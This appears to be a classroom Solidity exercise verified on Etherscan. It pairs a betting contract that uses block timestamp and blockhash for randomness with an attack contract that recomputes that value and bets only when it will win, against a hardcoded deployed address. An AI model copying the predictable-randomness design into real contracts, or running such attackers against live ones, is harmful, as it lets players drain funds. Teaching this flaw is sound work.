/**
 *Submitted for verification at Etherscan.io on 2021-05-26
*/

pragma solidity ^0.4.24;
contract class44_game{
    
    address owner;
    constructor() payable{
        owner = msg.sender;
        require(msg.value == 1 ether);
    }
    
    event win(address);
    function get_random() public view returns (uint){
        bytes32 random = keccak256(abi.encodePacked(now,blockhash(block.number -1 )));
        return uint(random)%1000;
    }
    
    function play() public payable{
        require(msg.value == 0.01 ether);
        if(get_random() >= 500){
            msg.sender.transfer(0.02 ether);
            emit win(msg.sender);
        }
    }
    
    function () public payable{
        require(msg.value == 1 ether);
        
    }
    function queryBalance() public view returns(uint){
        return address(this).balance;
    }
    
    function killContract() public{
        require(msg.sender == owner);
        selfdestruct(0xa3c988a6945DE3474093E868B4D96B330A6ebC29);//send to my account
    }
}

contract class44_game_attack{
    address public class44Game = 0x4035a2f3B4a6F1fe833Ea02CfE25fbf91AD9A380;
    class44_game gameContract = class44_game(class44Game);
    
    function get_random()public view returns(uint){
        bytes32 random = keccak256(abi.encodePacked(now,blockhash(block.number -1 )));
         return uint(random)%1000;
    }
    function attack() public payable{
        require(get_random() >=500);
        gameContract.play.value(0.01 ether)();
    }
    function () public payable{
        
    }
    constructor () public payable{
        require(msg.value == 1 ether);
    }
}